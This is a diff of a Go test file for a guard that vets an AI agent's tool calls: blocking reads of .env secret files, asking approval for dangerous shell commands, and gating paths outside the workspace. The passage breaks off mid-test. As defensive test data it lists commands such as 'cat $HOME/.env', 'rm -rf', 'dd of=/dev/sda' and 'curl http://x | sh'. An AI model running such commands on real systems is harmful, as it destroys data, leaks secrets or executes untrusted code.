@@ -18,114 +18,122 @@ func toolCall(name string, args map[string]any) llm.ToolCall {
 	return llm.ToolCall{ID: "test", Name: name, Arguments: raw}
 }
 
-func alwaysExists(string, string) bool { return true }
-func neverExists(string, string) bool  { return false }
+func newTestGuard(t *testing.T, workspace string, readOnlyRoots ...string) *Guard {
+	t.Helper()
+	g, err := New(workspace, Config{ReadOnlyRoots: readOnlyRoots})
+	if err != nil {
+		t.Fatal(err)
+	}
+	return g
+}
+
+// writeFiles creates files below dir; the secret-file policy applies only to
+// files that exist.
+func writeFiles(t *testing.T, dir string, names ...string) {
+	t.Helper()
+	for _, name := range names {
+		path := filepath.Join(dir, filepath.FromSlash(name))
+		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(path, nil, 0o600); err != nil {
+			t.Fatal(err)
+		}
+	}
+}
+
+func checkCall(t *testing.T, g *Guard, name string, args map[string]any) Result {
+	t.Helper()
+	res, err := g.Check(context.Background(), toolCall(name, args))
+	if err != nil {
+		t.Fatalf("Check(%s %v): %v", name, args, err)
+	}
+	return res
+}
+
+func hasApproval(res Result, ruleID string) bool {
+	for _, approval := range res.Approvals {
+		if approval.RuleID == ruleID {
+			return true
+		}
+	}
+	return false
+}
 
 func TestGuard_AllowNonSecretFiles(t *testing.T) {
-	g, err := NewWithExists(t.TempDir(), Config{}, alwaysExists)
-	if err != nil {
-		t.Fatalf("New: %v", err)
-	}
+	workspace := t.TempDir()
 	cases := []string{"README.md", "src/main.go", ".envrc", "config.yaml"}
+	writeFiles(t, workspace, cases...)
+	g := newTestGuard(t, workspace)
 	for _, p := range cases {
-		res, err := g.Check(context.Background(), toolCall("read", map[string]any{"path": p}))
-		if err != nil {
-			t.Fatalf("Check(%q): %v", p, err)
-		}
-		if res.Decision != DecisionAllow {
+		if res := checkCall(t, g, "read", map[string]any{"path": p}); res.Decision != DecisionAllow {
 			t.Fatalf("Check(%q) = %v, want allow", p, res.Decision)
 		}
 	}
 }
 
 func TestGuard_DenySecretFiles(t *testing.T) {
-	g, _ := NewWithExists(t.TempDir(), Config{}, alwaysExists)
+	workspace := t.TempDir()
 	secrets := []string{".env", ".env.local", ".env.production", ".env.prod", ".dev.vars", "a/b/.env", "src/.env"}
+	writeFiles(t, workspace, secrets...)
+	g := newTestGuard(t, workspace)
 	for _, p := range secrets {
-		res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": p}))
-		if res.Decision != DecisionDeny {
-			t.Fatalf("Check(%q) = %v, want deny (rule %q)", p, res.Decision, res.RuleID)
-		}
-		if res.RuleID != "secret-files" {
-			t.Fatalf("RuleID=%q want secret-files", res.RuleID)
+		res := checkCall(t, g, "read", map[string]any{"path": p})
+		if res.Decision != DecisionDeny || res.RuleID != secretFilesRuleID {
+			t.Fatalf("Check(%q) = %v %q, want deny secret-files", p, res.Decision, res.RuleID)
 		}
 	}
 }
 
-func TestGuard_AllowedPatternsBypass(t *testing.T) {
-	g, _ := NewWithExists(t.TempDir(), Config{}, alwaysExists)
-	allowed := []string{".env.example", "foo.example.env", "bar.sample.env", ".env.test"}
-	for _, p := range allowed {
-		res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": p}))
-		if res.Decision != DecisionAllow {
-			t.Fatalf("Check(%q) = %v, want allow (allowed pattern)", p, res.Decision)
+func TestGuard_SecretTemplatesAllowed(t *testing.T) {
+	workspace := t.TempDir()
+	templates := []string{".env.example", "foo.example.env", "bar.sample.env", ".env.test"}
+	writeFiles(t, workspace, templates...)
+	g := newTestGuard(t, workspace)
+	for _, p := range templates {
+		if res := checkCall(t, g, "read", map[string]any{"path": p}); res.Decision != DecisionAllow {
+			t.Fatalf("Check(%q) = %v, want allow", p, res.Decision)
 		}
 	}
 }
 
-func TestGuard_OnlyIfExists_SkipsNonExistent(t *testing.T) {
-	g, _ := NewWithExists(t.TempDir(), Config{}, neverExists)
-	res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": ".env"}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("Check with neverExists: %v, want allow (file does not exist)", res.Decision)
+func TestGuard_SecretFileMustExist(t *testing.T) {
+	g := newTestGuard(t, t.TempDir())
+	if res := checkCall(t, g, "write", map[string]any{"path": ".env"}); res.Decision != DecisionAllow {
+		t.Fatalf("missing .env: %v, want allow", res.Decision)
 	}
 }
 
 func TestGuard_UnresolvedConservativelyDenies(t *testing.T) {
-	g, _ := NewWithExists(t.TempDir(), Config{}, neverExists)
-	// $VAR expansion: cannot prove absence, so deny
-	res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": "$HOME/.env"}))
-	if res.Decision != DecisionDeny {
+	g := newTestGuard(t, t.TempDir())
+	// $VAR expansion cannot prove absence.
+	if res := checkCall(t, g, "read", map[string]any{"path": "$HOME/.env"}); res.Decision != DecisionDeny {
 		t.Fatalf("Check unresolved: %v, want deny", res.Decision)
 	}
 }
 
-func TestGuard_ReadOnlyDoesNotBlockRead(t *testing.T) {
-	cfg := Config{Policies: []PolicyRule{
-		{ID: "ro", Patterns: []PatternConfig{{Pattern: "LOCKED.md"}}, Protection: ProtectionReadOnly},
-	}}
-	// ApplyBuiltins false so only our rule applies
-	f := false
-	cfg.ApplyBuiltinDefaults = &f
-	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
-	res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": "LOCKED.md"}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("readOnly should allow read: %v", res.Decision)
-	}
-	res, _ = g.Check(context.Background(), toolCall("write", map[string]any{"path": "LOCKED.md"}))
-	if res.Decision != DecisionDeny {
-		t.Fatalf("readOnly should deny write: %v", res.Decision)
-	}
-	res, _ = g.Check(context.Background(), toolCall("edit", map[string]any{"path": "LOCKED.md"}))
-	// edit uses the production "path" argument key
-	if res.Decision != DecisionDeny {
-		t.Fatalf("readOnly should deny edit: %v", res.Decision)
-	}
-}
-
 func TestGuard_BashPathExtraction(t *testing.T) {
-	g, _ := NewWithExists(t.TempDir(), Config{}, alwaysExists)
-	// bash cat .env should be denied via path token extraction
-	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "cat .env"}))
-	if res.Decision != DecisionDeny {
+	workspace := t.TempDir()
+	writeFiles(t, workspace, ".env", "README.md")
+	g := newTestGuard(t, workspace)
+	if res := checkCall(t, g, "bash", map[string]any{"command": "cat .env"}); res.Decision != DecisionDeny {
 		t.Fatalf("bash cat .env: %v want deny", res.Decision)
 	}
-	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "cat README.md"}))
-	if res.Decision != DecisionAllow {
+	if res := checkCall(t, g, "bash", map[string]any{"command": "cat README.md"}); res.Decision != DecisionAllow {
 		t.Fatalf("bash cat README: %v want allow", res.Decision)
 	}
 }
 
 func TestGuard_SessionAllow(t *testing.T) {
-	g, _ := NewWithExists(t.TempDir(), Config{}, alwaysExists)
-	call := toolCall("read", map[string]any{"path": ".env"})
-	res, _ := g.Check(context.Background(), call)
-	if res.Decision != DecisionDeny {
+	workspace := t.TempDir()
+	writeFiles(t, workspace, ".env")
+	g := newTestGuard(t, workspace)
+	args := map[string]any{"path": ".env"}
+	if res := checkCall(t, g, "read", args); res.Decision != DecisionDeny {
 		t.Fatalf("pre: %v want deny", res.Decision)
 	}
 	g.AllowSession(".env")
-	res, _ = g.Check(context.Background(), call)
-	if res.Decision != DecisionAllow {
+	if res := checkCall(t, g, "read", args); res.Decision != DecisionAllow {
 		t.Fatalf("post allow: %v want allow", res.Decision)
 	}
 }
@@ -186,211 +194,65 @@ func TestMaybePathLike(t *testing.T) {
 	}
 }
 
-func TestCompileFilePattern_BasenameVsFull(t *testing.T) {
-	p := compileFilePattern(PatternConfig{Pattern: ".env"})
-	if !p.test(".env") || !p.test("a/b/.env") {
-		t.Fatal("basename pattern should match any dir")
-	}
-	p2 := compileFilePattern(PatternConfig{Pattern: "a/.env"})
-	if p2.test(".env") {
-		t.Fatal("full-path pattern should not match bare .env")
-	}
-	if !p2.test("a/.env") {
-		t.Fatal("full-path pattern should match a/.env")
-	}
-}
-
-func TestCompileFilePattern_Regex(t *testing.T) {
-	p := compileFilePattern(PatternConfig{Pattern: `\.env$`, Regex: true})
-	if !p.test(".env") || !p.test("FOO.env") {
-		t.Fatal("regex (?i) should be case-insensitive")
-	}
-	if p.test("README.md") {
-		t.Fatal("regex should not match README")
-	}
-}
-
-// PR2: permission gate — PR4 turns dangerous into Ask
-func TestGuard_DangerousCommandBlocked(t *testing.T) {
-	g, _ := NewWithExists(t.TempDir(), Config{}, alwaysExists)
+func TestGuard_DangerousCommandAsks(t *testing.T) {
+	g := newTestGuard(t, t.TempDir())
 	cases := []string{
-		"rm -rf /tmp/x",
+		"rm -rf build",
 		"sudo apt update",
-		"dd of=/dev/sda if=/dev/zero",
-		"chmod -R 777 /tmp",
+		"dd of=disk.img if=zero.img",
+		"chmod -R 777 build",
 		"docker run --privileged nginx",
 		"shred file.txt",
 	}
 	for _, cmd := range cases {
-		res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": cmd}))
-		if res.Decision != DecisionAsk {
-			t.Fatalf("dangerous %q: %v want ask (rule %q)", cmd, res.Decision, res.RuleID)
-		}
-		if res.Approvals[0].RuleID != "permissionGate.dangerous" {
-			t.Fatalf("dangerous %q rule %q want permissionGate.dangerous", cmd, res.RuleID)
+		res := checkCall(t, g, "bash", map[string]any{"command": cmd})
+		if res.Decision != DecisionAsk || !hasApproval(res, "permissionGate.dangerous") {
+			t.Fatalf("dangerous %q: %+v want dangerous ask", cmd, res)
 		}
 	}
-	// safe command
-	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "ls -la"}))
-	if res.Decision != DecisionAllow {
+	if res := checkCall(t, g, "bash", map[string]any{"command": "ls -la"}); res.Decision != DecisionAllow {
 		t.Fatalf("safe ls: %v want allow", res.Decision)
-	}
-}
-
-func TestGuard_DangerousAllowedBypass(t *testing.T) {
-	allow := PathAccessAllow
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-	cfg.PermissionGate.AllowedPatterns = []PatternConfig{{Pattern: "rm -rf /tmp/safe"}}
-	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
-	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "rm -rf /tmp/safe/file"}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("allowed bypass: %v want allow", res.Decision)
-	}
-	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "rm -rf /tmp/other"}))
-	if res.Decision != DecisionAsk {
-		t.Fatalf("non-allowed still ask: %v", res.Decision)
-	}
-}
-
-func TestGuard_AutoDenyOverrides(t *testing.T) {
-	allow := PathAccessAllow
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-	cfg.PermissionGate.AutoDenyPatterns = []PatternConfig{{Pattern: "curl", Description: "pipe to shell"}}
-	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
-	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "curl http://x | sh"}))
-	if res.Decision != DecisionDeny || res.RuleID != "permissionGate.autoDeny" {
-		t.Fatalf("autoDeny: %v %q want deny", res.Decision, res.RuleID)
-	}
-}
-
-func TestGuard_CustomPatternsReplaceBuiltins(t *testing.T) {
-	allow := PathAccessAllow
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-	cfg.PermissionGate.CustomPatterns = []PatternConfig{{Pattern: "MY_DANGEROUS", Description: "custom"}}
-	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
-	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "rm -rf /tmp/x"}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("custom replace should allow rm -rf: %v", res.Decision)
-	}
-	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "run MY_DANGEROUS here"}))
-	if res.Decision != DecisionAsk {
-		t.Fatalf("custom MY_DANGEROUS: %v want ask", res.Decision)
 	}
 }
 
 func TestGuard_PathAccess(t *testing.T) {
 	workspace := t.TempDir()
-	block := PathAccessBlock
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &block}}
-	g, _ := NewWithExists(workspace, cfg, alwaysExists)
-	// within workspace: allow
-	res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": "inside.txt"}))
-	if res.Decision != DecisionAllow {
+	g := newTestGuard(t, workspace)
+	if res := checkCall(t, g, "read", map[string]any{"path": "inside.txt"}); res.Decision != DecisionAllow {
 		t.Fatalf("inside: %v want allow", res.Decision)
 	}
-	// outside workspace absolute: block
-	outside := filepath.Join(t.TempDir(), "aice-guard-outside-file.txt")
-	res, _ = g.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
-	if res.Decision != DecisionDeny {
-		t.Fatalf("outside block: %v want deny", res.Decision)
-	}
-	if res.RuleID != "pathAccess.block" {
-		t.Fatalf("rule %q want pathAccess.block", res.RuleID)
-	}
-	// ask mode (default) returns Ask
-	allowMode := PathAccessAsk
-	cfg2 := Config{PathAccess: PathAccessConfig{Mode: &allowMode}}
-	g2, _ := NewWithExists(workspace, cfg2, alwaysExists)
-	res, _ = g2.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
+	outside := filepath.Join(t.TempDir(), "nested", "outside.txt")
+	res := checkCall(t, g, "read", map[string]any{"path": outside})
 	if res.Decision != DecisionAsk || res.Approvals[0].RuleID != "pathAccess.ask" {
-		t.Fatalf("outside ask: %v %q want ask", res.Decision, res.RuleID)
+		t.Fatalf("outside: %+v want pathAccess.ask", res)
 	}
-	// allow mode
-	allow := PathAccessAllow
-	cfg3 := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-	g3, _ := NewWithExists(workspace, cfg3, alwaysExists)
-	res, _ = g3.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("allow mode: %v want allow", res.Decision)
+	reason := res.Approvals[0].Reason
+	if strings.Contains(reason, `\`) {
+		t.Fatalf("Reason uses backslash: %q", reason)
 	}
-}
-
-func TestGuard_PathAccessReasonUsesSlash(t *testing.T) {
-	workspace := t.TempDir()
-	block := PathAccessBlock
-	g, err := NewWithExists(workspace, Config{PathAccess: PathAccessConfig{Mode: &block}}, alwaysExists)
-	if err != nil {
-		t.Fatalf("NewWithExists: %v", err)
-	}
-	outside := filepath.Join(t.TempDir(), "nested", "secret.txt")
-	res, err := g.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
-	if err != nil {
-		t.Fatalf("Check: %v", err)
-	}
-	if res.Decision != DecisionDeny {
-		t.Fatalf("outside block: %v want deny", res.Decision)
-	}
-	if strings.Contains(res.Reason, `\`) {
-		t.Fatalf("Reason uses backslash: %q", res.Reason)
-	}
-	display := resolveForDisplay(filepath.Clean(outside), workspace)
-	if !strings.Contains(res.Reason, display) {
-		t.Fatalf("Reason %q does not contain display path %q", res.Reason, display)
-	}
-}
-
-func TestGuard_PathAccess_AllowedPaths(t *testing.T) {
-	workspace := t.TempDir()
-	block := PathAccessBlock
-	outsideDir := t.TempDir()
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &block, AllowedPaths: []AllowedPath{{Kind: "directory", Path: outsideDir}}}}
-	g, _ := NewWithExists(workspace, cfg, alwaysExists)
-	// file inside allowed directory: allow
-	p := filepath.Join(outsideDir, "sub", "file.txt")
-	res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": p}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("allowed dir: %v want allow", res.Decision)
-	}
-	// file as exact allow
-	outsideFile := filepath.Join(t.TempDir(), "aice-guard-allowed-exact.txt")
-	cfg2 := Config{PathAccess: PathAccessConfig{Mode: &block, AllowedPaths: []AllowedPath{{Kind: "file", Path: outsideFile}}}}
-	g2, _ := NewWithExists(workspace, cfg2, alwaysExists)
-	res, _ = g2.Check(context.Background(), toolCall("read", map[string]any{"path": outsideFile}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("allowed file exact: %v", res.Decision)
-	}
-	res, _ = g2.Check(context.Background(), toolCall("read", map[string]any{"path": outsideFile + ".other"}))
-	if res.Decision != DecisionDeny {
-		t.Fatalf("allowed file should not cover sibling: %v", res.Decision)
+	if display := resolveForDisplay(filepath.Clean(outside), workspace); !strings.Contains(reason, display) {
+		t.Fatalf("Reason %q does not contain display path %q", reason, display)
 	}
 }
 
 func TestGuard_PathAccess_SessionAllow(t *testing.T) {
-	workspace := t.TempDir()
-	block := PathAccessBlock
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &block}}
-	g, _ := NewWithExists(workspace, cfg, alwaysExists)
+	g := newTestGuard(t, t.TempDir())
 	outside := filepath.Join(t.TempDir(), "aice-guard-session.txt")
-	call := toolCall("read", map[string]any{"path": outside})
-	res, _ := g.Check(context.Background(), call)
-	if res.Decision != DecisionDeny {
+	args := map[string]any{"path": outside}
+	if res := checkCall(t, g, "read", args); res.Decision != DecisionAsk {
 		t.Fatalf("pre: %v", res.Decision)
 	}
 	g.AllowPathSession(outside, false)
-	res, _ = g.Check(context.Background(), call)
-	if res.Decision != DecisionAllow {
+	if res := checkCall(t, g, "read", args); res.Decision != DecisionAllow {
 		t.Fatalf("post session file allow: %v", res.Decision)
 	}
-	// dir grant
 	outsideDir := t.TempDir()
-	call2 := toolCall("read", map[string]any{"path": filepath.Join(outsideDir, "a", "b.txt")})
-	res, _ = g.Check(context.Background(), call2)
-	if res.Decision != DecisionDeny {
+	dirArgs := map[string]any{"path": filepath.Join(outsideDir, "a", "b.txt")}
+	if res := checkCall(t, g, "read", dirArgs); res.Decision != DecisionAsk {
 		t.Fatalf("pre dir: %v", res.Decision)
 	}
 	g.AllowPathSession(outsideDir, true)
-	res, _ = g.Check(context.Background(), call2)
-	if res.Decision != DecisionAllow {
+	if res := checkCall(t, g, "read", dirArgs); res.Decision != DecisionAllow {
 		t.Fatalf("post dir allow: %v", res.Decision)
 	}
 }
@@ -399,12 +261,7 @@ func TestGuard_PathAccess_SessionAllowCaseFold(t *testing.T) {
 	if runtime.GOOS != "windows" {
 		t.Skip("path grants are case-insensitive only on windows")
 	}
-	workspace := t.TempDir()
-	block := PathAccessBlock
-	g, err := NewWithExists(workspace, Config{PathAccess: PathAccessConfig{Mode: &block}}, alwaysExists)
-	if err != nil {
-		t.Fatalf("NewWithExists: %v", err)
-	}
+	g := newTestGuard(t, t.TempDir())
 	outside := filepath.Join(t.TempDir(), "aice-guard-case.txt")
 	g.AllowPathSession(outside, false)
 	alt := strings.ToUpper(outside)
@@ -446,13 +303,7 @@ func TestExtractActionsWindowsDrivePath(t *testing.T) {
 }
 
 func TestGuard_PathAccess_SessionAllowFileDoesNotGrantSibling(t *testing.T) {
-	workspace := t.TempDir()
-	ask := PathAccessAsk
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &ask}}
-	g, err := NewWithExists(workspace, cfg, alwaysExists)
-	if err != nil {
-		t.Fatalf("NewWithExists: %v", err)
-	}
+	g := newTestGuard(t, t.TempDir())
 	outsideDir := t.TempDir()
 	granted := filepath.Join(outsideDir, "granted.txt")
 	sibling := filepath.Join(outsideDir, "sibling.txt")
@@ -478,11 +329,7 @@ func TestGuard_PathAccess_SessionAllowFileDoesNotGrantSibling(t *testing.T) {
 
 func TestGuard_PathAccess_RejectsRootAndHomeSessionGrant(t *testing.T) {
 	workspace := t.TempDir()
-	ask := PathAccessAsk
-	g, err := NewWithExists(workspace, Config{PathAccess: PathAccessConfig{Mode: &ask}}, alwaysExists)
-	if err != nil {
-		t.Fatalf("NewWithExists: %v", err)
-	}
+	g := newTestGuard(t, workspace)
 
 	outside := filepath.Join(t.TempDir(), "outside.txt")
 	g.AllowPathSession("/", false)
@@ -523,69 +370,38 @@ func TestGuard_PathAccess_RejectsRootAndHomeSessionGrant(t *testing.T) {
 	}
 }
 
-// PR3: structural dangerous variants (vs substring)
-func TestGuard_StructuralDangerousVariants(t *testing.T) {
-	allow := PathAccessAllow
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
-	// rm variants that substring "rm -rf" would miss
-	variants := []string{
-		"rm -R -f /tmp/x",
-		"rm --recursive --force /tmp/x",
-		"rm -r -f /tmp/x",
-		"rm -Rfv /tmp/x",
-		"rm -fr /tmp/x",
+func TestGuard_StructuralDangerousMatching(t *testing.T) {
+	g := newTestGuard(t, t.TempDir())
+	cases := map[string]bool{
+		// rm variants that a substring "rm -rf" would miss
+		"rm -R -f build":                true,
+		"rm --recursive --force build":  true,
+		"rm -r -f build":                true,
+		"rm -Rfv build":                 true,
+		"rm -fr build":                  true,
+		"chmod -R 777 build":            true,
+		"chmod -R 755 build":            false,
+		"chmod 777 file":                false,
+		"docker run --privileged nginx": true,
+		"docker build --privileged .":   false,
+		// structural matching ignores words that are only arguments
+		"echo rm -rf build":     false,
+		`echo "rm -rf"`:         false,
+		"cat a | sudo rm -rf b": true,
 	}
-	for _, cmd := range variants {
-		res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": cmd}))
-		if res.Decision != DecisionAsk {
-			t.Fatalf("structural rm variant %q: %v want ask", cmd, res.Decision)
+	for cmd, dangerous := range cases {
+		res := checkCall(t, g, "bash", map[string]any{"command": cmd})
+		if got := hasApproval(res, "permissionGate.dangerous"); got != dangerous {
+			t.Fatalf("%q dangerous = %v, want %v (%+v)", cmd, got, dangerous, res)
 		}
-	}
-	// chmod variants: only -R + 777 should ask
-	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "chmod -R 777 /tmp"}))
-	if res.Decision != DecisionAsk {
-		t.Fatalf("chmod -R 777: %v want ask", res.Decision)
-	}
-	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "chmod -R 755 /tmp"}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("chmod -R 755: %v want allow", res.Decision)
-	}
-	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "chmod 777 /tmp/file"}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("chmod 777 without -R: %v want allow", res.Decision)
-	}
-	// docker privileged only for run/create
-	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "docker run --privileged nginx"}))
-	if res.Decision != DecisionAsk {
-		t.Fatalf("docker privileged run: %v", res.Decision)
-	}
-	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "docker build --privileged ."}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("docker build privileged should allow: %v", res.Decision)
-	}
-}
-
-func TestGuard_StructuralNoFalsePositive(t *testing.T) {
-	allow := PathAccessAllow
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
-	// echo rm -rf should not be flagged (structural: first word is echo)
-	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "echo rm -rf /tmp/x"}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("echo rm -rf false positive: %v", res.Decision)
-	}
-	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "echo \"rm -rf\""}))
-	if res.Decision != DecisionAllow {
-		t.Fatalf("echo quoted false positive: %v", res.Decision)
+		if dangerous && res.Approvals[0].Pattern == "" {
+			t.Fatalf("%q: dangerous approval has no pattern", cmd)
+		}
 	}
 }
 
 func TestGuard_UnknownToolAsks(t *testing.T) {
-	g, err := NewWithExists(t.TempDir(), Config{}, alwaysExists)
-	if err != nil {
-		t.Fatalf("New: %v", err)
-	}
+	g := newTestGuard(t, t.TempDir())
 	cases := []string{"mystery_tool", "Read", "read_file", "custom"}
 	for _, name := range cases {
 		res, err := g.Check(context.Background(), toolCall(name, map[string]any{"path": "README.md"}))
@@ -608,10 +424,7 @@ func TestGuard_UnknownToolAsks(t *testing.T) {
 }
 
 func TestGuard_KnownToolWithoutRestrictedActionAllows(t *testing.T) {
-	g, err := NewWithExists(t.TempDir(), Config{}, alwaysExists)
-	if err != nil {
-		t.Fatalf("New: %v", err)
-	}
+	g := newTestGuard(t, t.TempDir())
 	cases := []llm.ToolCall{
 		toolCall("read", map[string]any{}),
 		toolCall("write", map[string]any{"content": "x"}),
@@ -637,40 +450,12 @@ func TestGuard_KnownToolWithoutRestrictedActionAllows(t *testing.T) {
 	}
 }
 
-func TestGuard_SkillToolNotBlockedByFilePolicies(t *testing.T) {
-	apply := false
-	cfg := Config{
-		ApplyBuiltinDefaults: &apply,
-		Policies: []PolicyRule{
-			{ID: "ro", Patterns: []PatternConfig{{Pattern: "*"}}, Protection: ProtectionReadOnly},
-			{ID: "na", Patterns: []PatternConfig{{Pattern: "*"}}, Protection: ProtectionNoAccess},
-		},
-	}
-	g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
-	if err != nil {
-		t.Fatalf("New: %v", err)
-	}
-	if isBlocked(ProtectionReadOnly, "skill") {
-		t.Fatal("readOnly must not block skill")
-	}
-	if isBlocked(ProtectionNoAccess, "skill") {
-		t.Fatal("noAccess must not block skill")
-	}
-
-	res, err := g.Check(context.Background(), toolCall("skill", map[string]any{"name": "pdf"}))
-	if err != nil {
-		t.Fatalf("Check skill: %v", err)
-	}
-	if res.Decision != DecisionAllow {
-		t.Fatalf("skill under file policies: %v want allow", res.Decision)
-	}
-
-	res, err = g.Check(context.Background(), toolCall("write", map[string]any{"path": "LOCKED.md"}))
-	if err != nil {
-		t.Fatalf("Check write: %v", err)
-	}
-	if res.Decision != DecisionDeny {
-		t.Fatalf("write under readOnly/noAccess: %v want deny", res.Decision)
+func TestGuard_SkillToolNotBlockedBySecretFiles(t *testing.T) {
+	workspace := t.TempDir()
+	writeFiles(t, workspace, ".env")
+	g := newTestGuard(t, workspace)
+	if res := checkCall(t, g, "skill", map[string]any{"name": ".env"}); res.Decision != DecisionAllow {
+		t.Fatalf("skill named .env: %v want allow", res.Decision)
 	}
 }
 
@@ -679,11 +464,8 @@ func TestGuard_ReadOnlyRoots(t *testing.T) {
 	skillDir := t.TempDir()
 	inside := filepath.Join(skillDir, "references", "guide.md")
 	outside := filepath.Join(t.TempDir(), "other.txt")
-	cfg := Config{ReadOnlyRoots: []string{skillDir}}
-	g, err := NewWithExists(workspace, cfg, alwaysExists)
-	if err != nil {
-		t.Fatalf("New: %v", err)
-	}
+	writeFiles(t, skillDir, ".env")
+	g := newTestGuard(t, workspace, skillDir)
 
 	readTools := []string{"read", "grep", "find", "ls"}
 	for _, name := range readTools {
@@ -740,76 +522,21 @@ func TestGuard_ReadOnlyRoots(t *testing.T) {
 	}
 }
 
-func TestGuard_ReadOnlyRootsBlockMode(t *testing.T) {
-	workspace := t.TempDir()
-	skillDir := t.TempDir()
-	inside := filepath.Join(skillDir, "scripts", "run.sh")
-	outside := filepath.Join(t.TempDir(), "other.txt")
-	block := PathAccessBlock
-	g, err := NewWithExists(workspace, Config{
-		ReadOnlyRoots: []string{skillDir},
-		PathAccess:    PathAccessConfig{Mode: &block},
-	}, alwaysExists)
-	if err != nil {
-		t.Fatalf("New: %v", err)
-	}
-
-	res, err := g.Check(context.Background(), toolCall("read", map[string]any{"path": inside}))
-	if err != nil {
-		t.Fatalf("Check read: %v", err)
-	}
-	if res.Decision != DecisionAllow {
-		t.Fatalf("read inside root in block mode: %v want allow", res.Decision)
-	}
-	res, err = g.Check(context.Background(), toolCall("write", map[string]any{"path": inside}))
-	if err != nil {
-		t.Fatalf("Check write: %v", err)
-	}
-	if res.Decision != DecisionDeny || res.RuleID != "pathAccess.block" {
-		t.Fatalf("write inside root in block mode: %v %q want deny", res.Decision, res.RuleID)
-	}
-	res, err = g.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
-	if err != nil {
-		t.Fatalf("Check outside: %v", err)
-	}
-	if res.Decision != DecisionDeny || res.RuleID != "pathAccess.block" {
-		t.Fatalf("read outside root in block mode: %v %q want deny", res.Decision, res.RuleID)
-	}
-}
-
 func TestGuard_PathExtractionAST(t *testing.T) {
-	workspace := t.TempDir()
-	block := PathAccessBlock
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &block}}
-	g, _ := NewWithExists(workspace, cfg, alwaysExists)
-	// AST should extract redirect target as forced path
+	g := newTestGuard(t, t.TempDir())
 	outside := filepath.Join(t.TempDir(), "aice-ast-redirect.txt")
-	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "echo hi > " + filepath.ToSlash(outside)}))
-	if res.Decision != DecisionDeny {
-		t.Fatalf("redirect outside: %v want deny", res.Decision)
+	res := checkCall(t, g, "bash", map[string]any{"command": "echo hi > " + filepath.ToSlash(outside)})
+	if res.Decision != DecisionAsk || !hasApproval(res, "pathAccess.ask") {
+		t.Fatalf("redirect outside: %+v want path ask", res)
 	}
-	// Expansion-aware: $HOME/.env should be unresolved and conservatively denied (if file policy)
-	// but path-access: $HOME expands to home, which is outside workspace, so also deny
-	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "cat $HOME/.env"}))
-	// Should be denied either by file policy or path access; allow either
-	if res.Decision != DecisionDeny {
+	// $HOME/.env is unresolved and cannot be proven absent.
+	if res := checkCall(t, g, "bash", map[string]any{"command": "cat $HOME/.env"}); res.Decision != DecisionDeny {
 		t.Fatalf("$HOME expansion: %v want deny", res.Decision)
-	}
-	// Pipeline: cat inside, sudo rm outside – sudo should be ask
-	allow2 := PathAccessAllow
-	cfg2 := Config{PathAccess: PathAccessConfig{Mode: &allow2}}
-	g2, _ := NewWithExists(t.TempDir(), cfg2, alwaysExists)
